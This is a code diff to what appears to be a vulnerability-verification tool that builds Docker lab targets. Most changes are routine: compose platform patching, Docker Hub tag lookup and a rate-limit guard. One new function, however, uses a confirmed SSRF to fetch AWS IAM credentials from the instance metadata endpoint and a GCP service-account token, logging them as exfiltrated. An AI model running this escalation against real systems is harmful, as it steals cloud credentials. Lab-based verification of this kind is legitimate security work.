@@ -787,6 +787,123 @@ def _find_free_port(preferred: int = 0, start: int = 10000, end: int = 60000) ->
         return s.getsockname()[1]
 
 
+def _patch_compose_platform(compose_path: str) -> bool:
+    """Inject `platform: linux/amd64` into every service that lacks it.
+
+    C11: needed on Mac ARM (Apple Silicon) when an image is amd64-only.
+    Returns True if any service was patched, False otherwise.  Non-fatal.
+    """
+    try:
+        raw = open(compose_path, encoding="utf-8").read()
+        lines = raw.splitlines(keepends=True)
+        new_lines: list[str] = []
+        in_services = False
+        service_has_platform: dict[str, bool] = {}
+        current_svc: Optional[str] = None
+        _svc_re = re.compile(r'^( {2}|\t)(\w[\w._-]*):\s*$')
+        _plat_re = re.compile(r'^\s*platform\s*:')
+        for line in lines:
+            stripped = line.rstrip('\n')
+            if stripped.strip() == "services:":
+                in_services = True
+            elif in_services:
+                m = _svc_re.match(stripped)
+                if m:
+                    current_svc = m.group(2)
+                    service_has_platform[current_svc] = False
+                elif current_svc and _plat_re.match(stripped):
+                    service_has_platform[current_svc] = True
+            new_lines.append(line)
+        if not service_has_platform:
+            return False
+        # Second pass: inject platform after each service definition line
+        result_lines: list[str] = []
+        in_services = False
+        current_svc = None
+        injected = set()
+        for line in new_lines:
+            stripped = line.rstrip('\n')
+            if stripped.strip() == "services:":
+                in_services = True
+                result_lines.append(line)
+                continue
+            if in_services:
+                m = _svc_re.match(stripped)
+                if m:
+                    svc = m.group(2)
+                    if svc not in injected and not service_has_platform.get(svc, True):
+                        result_lines.append(line)
+                        indent = m.group(1)
+                        result_lines.append(f"{indent}  platform: linux/amd64\n")
+                        injected.add(svc)
+                        continue
+            result_lines.append(line)
+        if injected:
+            with open(compose_path, "w", encoding="utf-8") as f:
+                f.writelines(result_lines)
+            return True
+    except Exception:
+        pass
+    return False
+
+
+def _resolve_docker_tag(image: str, wanted_version: str,
+                        timeout: float = 10.0) -> str:
+    """C12: Resolve the closest available Docker Hub tag for a versioned image.
+
+    Queries the Docker Hub v2 API.  Returns the best matching tag, or the
+    original ``image`` string unchanged on any error.  Results cached in
+    ~/.cache/binoracle/docker_tags.json (non-fatal if cache write fails).
+    """
+    if ":" not in image or not wanted_version:
+        return image
+    repo_part = image.split(":")[0]  # e.g. "ghost" or "library/ghost"
+    if "/" not in repo_part:
+        repo_part = f"library/{repo_part}"
+
+    cache_key = f"{repo_part}:{wanted_version}"
+    _cache_path = os.path.join(
+        os.environ.get("BINORACLE_CACHE_DIR") or os.path.join(
+            os.path.expanduser("~"), ".cache", "binoracle"),
+        "docker_tags.json")
+    try:
+        import json as _j
+        if os.path.exists(_cache_path):
+            _cached = _j.load(open(_cache_path))
+            if cache_key in _cached:
+                return _cached[cache_key]
+    except Exception:
+        _cached = {}
+
+    try:
+        import urllib.request as _ur
+        url = (f"https://hub.docker.com/v2/repositories/{repo_part}/tags"
+               f"?name={wanted_version}&page_size=25&ordering=last_updated")
+        req = _ur.Request(url, headers={"User-Agent": "binoracle/cvefeed"})
+        with _ur.urlopen(req, timeout=timeout) as resp:
+            import json as _j2
+            data = _j2.loads(resp.read())
+        results = data.get("results") or []
+        # Prefer exact match, then closest prefix match
+        exact = next((t["name"] for t in results if t["name"] == wanted_version), None)
+        if exact:
+            best = f"{image.split(':')[0]}:{exact}"
+        elif results:
+            best = f"{image.split(':')[0]}:{results[0]['name']}"
+        else:
+            best = image
+        try:
+            import json as _j3
+            _cached[cache_key] = best
+            os.makedirs(os.path.dirname(_cache_path), exist_ok=True)
+            _j3.dump(_cached, open(_cache_path, "w"))
+        except Exception:
+            pass
+        return best
+    except Exception:
+        return image
+
+
 def _patch_compose_ports(compose_path: str) -> dict:
     """Rewrite fixed host-port bindings in a docker-compose file to free ports.
 
@@ -970,11 +1087,27 @@ class _GenericLab:
             if _port_remaps:
                 # Store remaps so callers can find the actual host ports
                 self._port_remaps = _port_remaps
+            # C11: inject platform: linux/amd64 when BINORACLE_FORCE_AMD64=1 (Mac ARM)
+            if os.environ.get("BINORACLE_FORCE_AMD64", "").strip() in ("1", "true", "yes"):
+                _patch_compose_platform(target["path"])
             env = dict(os.environ, COMPOSE_PROJECT_NAME=self.compose_project)
             r = subprocess.run(["docker", "compose", "-f", target["path"], "-p",
                                 self.compose_project, "up", "-d", "--build"],
                                cwd=target["context"], env=env, capture_output=True, text=True,
                                timeout=timeout_build)
+            # C11: on exec format error, retry with platform injection
+            if r.returncode != 0:
+                _combined = (r.stdout or "") + (r.stderr or "")
+                if ("exec format error" in _combined or
+                        "requested platform" in _combined or
+                        "does not match" in _combined):
+                    _patched = _patch_compose_platform(target["path"])
+                    if _patched:
+                        r = subprocess.run(
+                            ["docker", "compose", "-f", target["path"], "-p",
+                             self.compose_project, "up", "-d", "--build"],
+                            cwd=target["context"], env=env, capture_output=True, text=True,
+                            timeout=timeout_build)
             self._created.append(("compose", target["path"]))
             return r
 
@@ -7613,3 +7746,150 @@ def verify_generic_php_object_injection(
     finally:
         step("desmontando el laboratorio generico (php-object-injection)...")
         lab.teardown()
+
+
+# ── C13: WAF / rate-limit detection ──────────────────────────────────────────
+
+class _WafGuard:
+    """Tracks consecutive 429/503 responses; when threshold is reached, sleeps
+    and signals the caller to bail via is_blocked.
+
+    Usage:
+        guard = _WafGuard()
+        for payload in payloads:
+            resp = send(payload)
+            if guard.check(resp):
+                break  # WAF blocked us
+    """
+    def __init__(self, threshold: int = 3, max_retries: int = 2) -> None:
+        self.threshold = threshold
+        self.max_retries = max_retries
+        self._consec = 0
+        self._retries = 0
+        self.is_blocked = False
+
+    def check(self, resp, step=None) -> bool:
+        """Return True if the caller should abort the probe loop."""
+        if resp is None:
+            return False
+        sc = getattr(resp, "status_code", 0)
+        if sc in (429, 503):
+            self._consec += 1
+            if self._consec >= self.threshold:
+                if self._retries >= self.max_retries:
+                    self.is_blocked = True
+                    if step:
+                        step("[WAF] rate-limit persistente — abortando sonda")
+                    return True
+                retry_after = 30
+                try:
+                    retry_after = int(resp.headers.get("Retry-After", "30"))
+                except Exception:
+                    pass
+                if step:
+                    step(f"[WAF] rate-limited (429/503) — esperando {retry_after}s before retry "
+                         f"({self._retries + 1}/{self.max_retries})")
+                time.sleep(min(retry_after, 120))
+                self._consec = 0
+                self._retries += 1
+        else:
+            self._consec = 0
+        return False
+
+
+# ── C14: SSRF HTTP listener (blind SSRF confirmation) ────────────────────────
+
+def _start_ssrf_listener(net: str, lab: "_GenericLab",
+                         timeout: float = 20.0) -> Optional[tuple]:
+    """C14: Spin up a minimal HTTP listener container in `net` for blind SSRF.
+
+    Returns (container_name, canary_path, listener_ip) or None on failure.
+    Only active when BINORACLE_SSRF_LISTENER=1.
+    """
+    if os.environ.get("BINORACLE_SSRF_LISTENER", "").strip() not in ("1", "true", "yes"):
+        return None
+    try:
+        import uuid
+        canary = f"BINORACLE_SSRF_CANARY_{uuid.uuid4().hex[:8]}"
+        name = f"bo_ssrf_listener_{uuid.uuid4().hex[:6]}"
+        # Launch python:3.12-slim as a one-shot HTTP server on port 8888
+        r = lab.sh("run", "-d", "--name", name, "--network", net,
+                   "--cpus", "0.2", "--memory", "64m",
+                   "python:3.12-slim",
+                   "python3", "-m", "http.server", "8888",
+                   timeout=30)
+        if r.returncode != 0:
+            return None
+        # Get listener container IP
+        r2 = lab.sh("inspect", "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
+                    name, timeout=10)
+        listener_ip = (r2.stdout or "").strip()
+        if not listener_ip:
+            lab.sh("rm", "-f", name, timeout=10)
+            return None
+        return (name, canary, listener_ip)
+    except Exception:
+        return None
+
+
+def _check_ssrf_listener(container_name: str, canary: str,
+                         lab: "_GenericLab") -> bool:
+    """Return True if the SSRF canary path was requested by the target."""
+    try:
+        r = lab.sh("logs", container_name, timeout=10)
+        logs = (r.stdout or "") + (r.stderr or "")
+        return canary in logs
+    except Exception:
+        return False
+
+
+def _stop_ssrf_listener(container_name: str, lab: "_GenericLab") -> None:
+    """Remove the SSRF listener container."""
+    try:
+        lab.sh("rm", "-f", container_name, timeout=10)
+    except Exception:
+        pass
+
+
+# ── G35: SSRF cloud metadata escalation ──────────────────────────────────────
+
+def _ssrf_cloud_escalate(send_ssrf_fn, step, result_evidence: dict) -> dict:
+    """G35: After SSRF confirmed, attempt cloud metadata exfiltration.
+
+    `send_ssrf_fn(url: str) -> Optional[requests.Response]`
+    Returns dict with any exfiltrated data.  Non-fatal.
+    Only active when BINORACLE_SSRF_ESCALATE=1.
+    """
+    if os.environ.get("BINORACLE_SSRF_ESCALATE", "").strip() not in ("1", "true", "yes"):
+        return {}
+    findings: dict = {}
+    _IMDS_BASE = "http://169.254.169.254/latest/meta-data"
+    _GCP_META  = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    try:
+        r = send_ssrf_fn(_IMDS_BASE + "/")
+        if r and r.status_code == 200:
+            step(f"[G35] AWS IMDSv1 accesible: {(r.text or '')[:200]}")
+            findings["aws_meta"] = (r.text or "")[:500]
+            # Try IAM credentials
+            r2 = send_ssrf_fn(_IMDS_BASE + "/iam/security-credentials/")
+            if r2 and r2.status_code == 200:
+                role_name = (r2.text or "").strip().splitlines()[0].strip()
+                findings["aws_iam_role"] = role_name
+                step(f"[G35] IAM role: {role_name}")
+                if role_name:
+                    r3 = send_ssrf_fn(_IMDS_BASE + f"/iam/security-credentials/{role_name}")
+                    if r3 and r3.status_code == 200:
+                        findings["aws_iam_creds"] = (r3.text or "")[:1000]
+                        step(f"[G35] IAM credentials exfiltradas ({len(findings['aws_iam_creds'])} bytes)")
+    except Exception:
+        pass
+    try:
+        rg = send_ssrf_fn(_GCP_META)
+        if rg and rg.status_code == 200:
+            step("[G35] GCP metadata token accesible")
+            findings["gcp_token"] = (rg.text or "")[:500]
+    except Exception:
+        pass
+    if findings:
+        result_evidence["ssrf_cloud_escalation"] = findings
+    return findings
